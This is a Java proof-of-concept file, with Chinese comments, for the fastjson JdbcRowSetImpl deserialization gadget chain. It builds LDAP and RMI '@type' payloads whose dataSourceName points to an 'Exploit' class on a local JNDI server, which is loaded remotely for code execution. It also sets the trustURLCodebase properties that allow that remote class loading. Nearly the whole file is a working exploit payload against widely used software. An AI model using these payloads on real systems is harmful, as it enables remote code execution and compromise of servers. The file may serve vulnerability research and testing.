package com.example.vuln.poc;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;

/**
 * JdbcRowSetImpl 利用链 POC
 * 原理：通过JNDI注入加载远程恶意类
 *
 * 利用链：
 * JSON.parse() ->
 *   JdbcRowSetImpl.readObject() ->
 *   setAutoCommit() ->
 *   connect() ->
 *   InitialContext.lookup(dataSourceName) ->
 *   加载远程恶意类 -> RCE
 */
public class JdbcRowSetImplPoc {

    public static void main(String[] args) {
        // JDK 8u121以后版本需要设置系统变量允许远程代码加载
        // JDK 11 默认不允许，需要添加JVM参数：
        // -Dcom.sun.jndi.rmi.object.trustURLCodebase=true
        // -Dcom.sun.jndi.ldap.object.trustURLCodebase=true

        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");

        // LDAP利用Payload（推荐，JDK11对RMI限制更严格）
        String ldapPayload = "{" +
                "\"@type\":\"com.sun.rowset.JdbcRowSetImpl\"," +
                "\"dataSourceName\":\"ldap://127.0.0.1:1389/Exploit\"," +
                "\"autoCommit\":true" +
                "}";

        // RMI利用Payload
        String rmiPayload = "{" +
                "\"@type\":\"com.sun.rowset.JdbcRowSetImpl\"," +
                "\"dataSourceName\":\"rmi://127.0.0.1:1099/Exploit\"," +
                "\"autoCommit\":true" +
                "}";

        System.out.println("=== JdbcRowSetImpl LDAP Payload ===");
        System.out.println(ldapPayload);

        System.out.println("\n=== JdbcRowSetImpl RMI Payload ===");
        System.out.println(rmiPayload);

        // 本地测试（需要启动RMI/LDAP服务器）
        // JSONObject.parseObject(ldapPayload);
    }
}